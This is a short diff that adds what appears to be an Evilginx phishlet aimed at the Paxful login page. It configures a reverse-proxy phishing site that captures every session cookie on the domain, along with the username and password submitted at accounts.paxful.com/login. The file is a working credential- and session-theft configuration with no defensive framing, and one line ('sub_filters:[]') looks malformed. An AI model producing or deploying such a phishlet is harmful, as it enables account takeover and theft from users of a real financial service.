@@ -1,0 +1,24 @@
+author: '@mk'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: '.paxful.com', session: true, is_landing: true}
+  
+sub_filters:[]
+  
+auth_tokens:
+  - domain: '.paxful.com'
+    keys: ['.*,regexp']
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'accounts.paxful.com'
+  path: '/login'
